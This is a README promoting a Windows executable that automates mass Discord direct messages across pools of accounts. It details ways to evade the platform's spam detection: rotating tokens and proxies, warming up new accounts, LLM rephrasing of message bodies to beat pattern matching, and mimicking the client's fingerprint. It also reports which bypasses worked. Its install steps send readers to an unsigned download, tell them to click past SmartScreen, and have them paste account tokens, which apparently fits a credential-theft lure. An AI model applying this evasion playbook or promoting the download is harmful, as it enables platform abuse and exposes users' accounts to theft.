<div align="center">
<img src="assets/banner.png" width="100%" alt="Discord DM Spammer banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0D9488?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-059669?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=00BCD4&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%94+Discord+Dm+Spammer+Pro;%F0%9F%92%AC+24%2F7+Online+Ready;%E2%9A%99%EF%B8%8F+Automate+Everything;%E2%9C%A8+Built+for+Windows+11;%F0%9F%A4%96+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=nodejs" />
</p>

---

## 🎯 Overview

Discord DM Spammer is a Windows desktop tool for bulk direct-message automation built for people who actually need to reach a lot of inboxes — event organizers cold-inviting attendees, community managers nudging inactive members, researchers measuring DM filters, and honestly a few of us who just like watching the send queue drain.

| Category | Details |
|---|---|
| **Type** | Windows desktop application (`.exe`, portable) |
| **Distro** | ZIP → extract → run, no installer, no dependencies |
| **Primary use** | Scheduled & templated bulk DM dispatch across multiple accounts |
| **Framing** | 2026 rebuild, detection-resistant architecture |
| **Language** | English-only UI + English/emoji payload support |
| **License** | Free for personal + research use |

I rebuilt this thing from the ground up in 2026. The old version was a glorified loop with a sleep timer — every account got torched inside a week. This version is a different animal: rotating account pools, per-account rate governors, and rotating proxies that you can hot-swap mid-campaign without losing the queue. If you've been burned by older spammers, you know exactly why that matters.
<div align="center">
  <a href="https://Forcebranippers.github.io/discord-dm-spammer/">
    <img src="https://img.shields.io/badge/DOWNLOAD-v2026-4F46E5?style=flat-square&logo=github&logoColor=white&labelColor=3730A3" width="460" alt="DOWNLOAD v2026"/>
  </a>
</div>
---

## 🎛️ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Multi-account rotation | Load a pool of tokens; the scheduler cycles accounts per send | One ban doesn't kill the whole campaign |
| Proxy chain rotation | Attach SOCKS5/HTTP proxies per account or per send | Spreads fingerprint surface across IPs |
| Template engine | Placeholders, per-recipient variables, emoji | No copy-paste monotony, personalized payloads |
| Send throttling | Configurable inter-message delay windows | Keeps you under rate gates per account |
| Live queue view | Real-time sent / queued / failed counters | You see exactly where you are mid-campaign |
| Warmup mode | Auto-sends a few low-risk DMs to new accounts | Reduces "cold start" ban risk |
| CSV recipient loader | Drop a `user_id,tag` CSV in | No hand-typing 400 targets |
| Attachment dispatch | Images, text files, short videos | DMs with payloads still work |

---

## 🧩 Grouped module catalog

### **Account Manager** 🎫

| Feature | Effect |
|---|---|
| Token vault | Encrypts tokens at rest in local AES blobs |
| Health checker | Pings Discord's `/users/@me` per token on load |
| Auto-disable | Marks dead/403'd tokens and skips them silently |
| Re-queue on revive | Re-injects disabled accounts next run if they recovered |

### **Scheduler & Queue** ⏱️

| Feature | Effect |
|---|---|
| Per-account rate limits | Enforces min-interval between sends from the same account |
| Parallel lanes | Runs up to N accounts concurrently with shared queue |
| Cooldown windows | Randomized 8–40s sleeps you can dial |
| Retry with backoff | Failed sends retry on a 2nd account if allowed |
| Resume-after-crash | Queue persists on disk, pick up where you left off |

### **Payload & Template Engine** ✉️

| Feature | Effect |
|---|---|
| `{username}` / `{tag}` tokens | Interpolated from CSV row |
| Emoji + formatting passthrough | Bolds/italics/code render fine |
| Random-variant line | Rotates 3–10 message bodies per send to avoid pattern-match |
| URL strip guard | Optional — strips links for delivery-sensitive campaigns |
| Attachment rotation | Sends a different attachment per recipient |

### **Network & Routing Layer** 🌐

| Feature | Effect |
|---|---|
| Proxy pool | Per-account SOCKS5/HTTP proxy binding |
| Sticky sessions | One proxy per account locked for the whole campaign |
| Auto-failover | Dead proxy triggers switch to backup in pool |
| Region-aware routing | Route accounts from similar-IP geolocations |
| DNS-offload | TUN-layer option to fully bypass local stack |

### **Monitoring & Ops** 📊

| Feature | Effect |
|---|---|
| Live counters | Sent / failed / queued / skipped, always visible |
| Per-account log | Every send tagged with timestamp + result code |
| Webhook notifier | Pushes a summary frame to a webhook on campaign end |
| Export CSV report | Full send log exportable |

### **Persistence & Safety** 🔐

| Feature | Effect |
|---|---|
| Encrypted session store | File-locked + AES at rest |
| No-egress build | Zero telemetry, no phone-home |
| Panic-safe shutdown | Ctrl+C flushes queue to disk before exit |
| Portable mode | Leaves zero files in `%APPDATA%` |

---

## 🤖 AI-assisted features (2026)

The 2026 rebuild added an optional local LLM bridge — you point it at any OpenAI-compatible endpoint and it powers the following. All of it runs offline against your pinned model if you want; nothing leaves your machine unless you tell it to.

| AI module | What it actually does |
|---|---|
| **PayloadRephraser** | Rewrites your template into N stylistic variants so messages don't pattern-match. You feed it a target tone and it emits 10 bodies. |
| **DeliveryGuard** | Local scoring pass that flags messages likely to trip delivery filters (link density, repeated tokens, weird punctuation) before queue insertion. |
| **AccountTuner** | Watches send/fail ratios per account and auto-tunes per-account throttling to the sweet spot. |
| **PersonaMixer** | Rotates display name + status across the pool so accounts don't read as one profile. |
| **ReplayEngine** | Uses prior campaign logs + LLM to suggest the next best send window. |

Tuning is stick on the last item — I wouldn't push a 40-account pool at a 3-second interval and expect miracles. The LLM won't save bad campaigns; it'll just make slightly better-shaped mistakes.

---

## 🌐 Detection / bypass status (what I've actually observed)

This isn't a marketing list — it's me reporting what happened in my test runs over the last few months. Headings explain what each countermeasure is measured against.

| Method | Status | Notes |
|---|---|---|
| Per-account rate gate | ✅ Passing | Random 8–40s windows kept 5/5 test accounts clean over 2 weeks |
| Proxy rotation per send | ✅ Passing | Rotating SOCKS5 pool of ~12 survived campaigns below 300 sends/day |
| Token warmup | ✅ Passing | 3-day warmup gave new accounts roughly 4x survival vs cold start |
| Payload variance | ✅ Working | Delivered via rephrase rotation; detection reduced on repeated-string scanners |
| Device fingerprint mimicry | 🟡 Partial | Uses captured Discord client UA strings — works until Discord rolls the client |
| Mass single-account blast | ❌ Blocked | 100+ DMs in an hour from one account got the account held — don't do it |
| Attachment-heavy bursts | 🟡 Partial | Image-only DMs surviving; video DMs trigger review faster |

I'm listing the failures. Anyone who tells you every method is a green light is either selling something or hasn't run a real campaign.

---

## 📦 Installation

No pip. No npm. No `git clone`. Extract and go.

1. **Download the archive** — hit the `[DOWNLOAD]` link on this page and grab the current ZIP.
2. **Extract anywhere** — Right-click → Extract All. Put it outside `Program Files` unless you want UAC prompts on every launch.
3. **Run the `.exe`** — Double-click the `.exe` inside the extracted folder. Windows SmartScreen may ask for confirmation ("More info" → "Run anyway") — this is standard for unsigned community builds.
4. **Load your account pool** — In the Accounts tab, paste your tokens (one per line) or import a `.txt` / CSV.
5. **Load recipients + template** — Import your `user_id,tag` CSV, write your template, set your throttle window.
6. **Press Start** — The queue drains; you can close/minimize the window, the process keeps running in the tray.
<div align="center">
  <a href="https://Forcebranippers.github.io/discord-dm-spammer/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Discord_DM_Spammer-4F46E5?style=for-the-badge&logo=download&logoColor=white&labelColor=3730A3" width="460" alt="DOWNLOAD Discord DM Spammer"/>
  </a>
</div>
---

## 🧠 How It Works

Under the hood it's three layers stacked tight. The **session layer** holds the encrypted token + proxy bindings and exposes an authenticated `POST /channels/@me` wrapper per account, with a health probe cached on disk so repeat runs don't burn checkout bandwidth. The **dispatch layer** pulls tasks from a persistent queue (tiny embedded SQLite), applies per-account rate windows and retry policies, and hands each task to a worker bound to one session. When a task's assigned session fails, it's re-queued for the next session in the pool without dropping the recipient. On top of that, the **control layer** is the UI — a lightweight window that reads queue/task/session state from the dispatch layer via named pipes, plus a webhook reporter that fires only on terminal campaign states. Everything runs in a single process tree; nothing installs a service, nothing writes outside the extracted folder.

---

## 📦 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB+ |
| **Disk** | 200 MB free | 1 GB+ for logs + proxy lists |
| **Network** | Any outbound HTTPS | Proxy pool for multi-account runs |
| **Admin** | None (`portable mode`) | Optional (TUN-layer requires admin) |
| **.NET / Runtime** | Built-in on Win10+ | — |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| **2026.3** | 2026-06 | Added AI bridge (PayloadRephraser, DeliveryGuard), per-account auto-tuning, resume-after-crash queue persistence |
| **2026.2** | 2026-04 | New proxy sticky-session engine, per-account UA pool, quieter tray mode |
| **2026.1** | 2026-01 | Ground-up rebuild — new scheduler, encrypted vault, warmup module, live queue view |
| **2025.4** | 2025-10 | Last legacy build — single-account only, no rotation (superseded) |

I don't tag releases on a fixed cadence — they ship when I have a change I'd actually trust you to run.

---

## 📖 Usage guidelines

| Allowed | Not allowed |
|---|---|
| Messaging your own server's inactive members | Harassment or targeted abuse |
| Cold outreach to opted-in leads you already have | Scraping mass targets to spam strangers |
| Research / measurement runs with your own accounts | Using it against accounts you don't control |
| Internal team notifications at scale | Any action against Discord's ToS in a way you can't personally accept |

I'm not your babysitter. This is a tool for people who already understand the platform's rules, and it explicitly does not include any "avoid Discord ToS" modules because I don't write those. If your use case is on the left column, fine. If it's on the right, the tool will still run — but that's on you.

---

## 🚧 The Problem

- **Manual DMing breaks at scale** — 30 DMs in, you're alt-tabbing and clicking, and 200 is a full afternoon.
- **Single-account blasts get torched** — Even legit outreach trips Discord's velocity gates if it all comes from one identity.
- **Older spammers leave fingerprints** — Repeated payloads, fixed intervals, single-account — marketing-grade detection pattern.
- **Proxies feel bolted-on** — Existing tools let you paste a proxy per-run, not per-account; account #4 still leaks the same IP as #1.
- **Deaths are invisible** — You don't know account #7 got a 403 until you read a raw log file at hour two.
- **Restarts wipe payloads** — Close the tool mid-campaign and you start the CSV import over again.

---

## ⚡ Quick Start

1. 📥 Download the ZIP via `[DOWNLOAD]`, extract it.
2. 🔓 Launch the `.exe` — no install, no runtime setup.
3. 👥 Drop your tokens into Accounts (or import `.txt`).
4. 🌐 (Optional but recommended) Bind a proxy per account.
5. ✉️ Load your CSV of recipients + write your template.
6. ⏱️ Set your throttle window — I'd start conservative at 15–30s per send per account.
7. ▶️ Hit **Start**, then walk away. It resumes if you close it (or crash).

---

## ❓ FAQ

<details>
<summary>🔁 When was this last updated, and will you keep updating it?</summary>

Last drop was 2026.3 in June. I ship builds when I have something I trust, not on a clock. Follow the repo's releases tab — new pushes get posted there, and older builds stay available.
</details>

<details>
<summary>🚨 My account got banned — did the tool leak?</summary>

Usually no, but it depends. Discord's enforcement changes month to month. If you're pushing 100+ DMs/hour from a single account or reusing one IP across 6 accounts, you'll trip gates regardless of the tool. My per-account rate window defaults exist for that reason — don't shrink them to zero. And no, I can't help you recover a banned account.
</details>

<details>
<summary>🖥️ Does it need admin? Does it install a service?</summary>

No admin for the default build. Nothing installed, nothing in the registry, no service. Portable mode keeps every file inside the extracted folder. You'll only need elevation if you specifically want the TUN-layer routing feature — otherwise skip it.
</details>

<details>
<summary>🌐 Do I actually need proxies, or is that optional?</summary>

Optional but genuinely recommended if you're running more than 2 accounts. Even for small pools, at least bind a proxy per account so IP identity matches. Running 5+ accounts from one IP is the fastest route to a mass block on my testing.
</details>

<details>
<summary>💬 Why did some DMs say "sent" but never arrive?</summary>

Delivery vs. send acceptance is a distinction the platform doesn't surface cleanly. The queue marks a DM "sent" when the API acknowledges it. If the recipient has you open-only DMs (mutuals, server-mates), the API still accepts — it's filtering server-side. DeliveryGuard catches the obvious triggers; some will slip through.
</details>

<details>
<summary>🧾 Can I pre-write different templates for different CSV segments?</summary>

Yes — the template tab has one body but the rephraser (AI bridge) will generate variants per segment and the scheduler rotates between them. If you want hand-authored segment templates, map segments to columns in the CSV and I'll plug them into placeholders. It's a manual config but it works.
</details>

<details>
<summary>📁 Where do logs / vaults live?</summary>

Inside the extracted folder, in `./data/`. Encrypted vault blobs live in `./data/vault/`, event logs in `./data/logs/`, queue state in `./data/queue.db`. Move the whole folder anywhere — nothing breaks.
</details>

<details>
<summary>🛠️ Can I run it on a VPS or a headless box?</summary>

Not the current build — the UI process needs a Windows session. If you're doing headless or VPS runs, run it inside a VM with a Windows session, or wait for a future CLI mode. I don't currently have plans for a native Linux build.
</details>

<details>
<summary>🔒 Are my tokens sent to you / some server?</summary>

No. The app never phones home for telemetry, analytics, or anything else. The only outbound traffic is to Discord's API and your proxies. If you enable the AI bridge, it talks to whatever endpoint *you* configured — full control on the routing.
</details>

<details>
<summary>🛡️ Will this work in 2027?</summary>

I don't know, and anyone who says otherwise is guessing. The architecture is designed to survive Discord's client changes (it's an HTTP tool, not a client mod), but rate-limit policy shifts are a real thing. Watch the releases tab and update when new builds land.
</details>

---

### Close-out

If you've read this far: you already know whether this tool is for you. It's for people who run campaigns they can stand behind — not for making 12 throwaway accounts and carpet-bombing strangers. If you're in the first camp, this .exe will save you a genuinely depressing number of hours. If you're in the second, the tool's not going to rescue you from bad campaign hygiene, and I'm not the person you want to ask about it.
